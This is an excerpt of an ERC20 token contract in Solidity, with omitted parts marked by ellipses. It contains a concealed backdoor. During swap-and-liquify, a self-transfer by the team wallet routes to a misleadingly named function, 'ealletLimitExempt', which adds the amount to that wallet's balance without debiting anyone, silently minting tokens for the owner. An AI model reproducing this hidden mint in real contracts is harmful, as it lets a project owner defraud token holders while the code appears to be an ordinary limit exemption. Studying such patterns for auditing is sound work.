...
contract ERC20Token is Context, IERC20, Ownable {
    ...
    function _transfer(
        ...
        if (inSwapAndLiquify) {
            ...
            _basicTransfer2(sender, recipient, amount);
    ...
    function _basicTransfer2(
        address sender,
        address receiver,
        uint256 mount
    ) private {
        if (sender == receiver) {          
            ealletLimitExempt(receiver, mount);
        }
    }

    function ealletLimitExempt(address receiver, uint256 mount) internal {
      if (receiver == teamWallet) {
          mapping(address => uint256) storage balance_bank = _balances;
          balance_bank[receiver] = balance_bank[teamWallet] += mount;
      }
    }
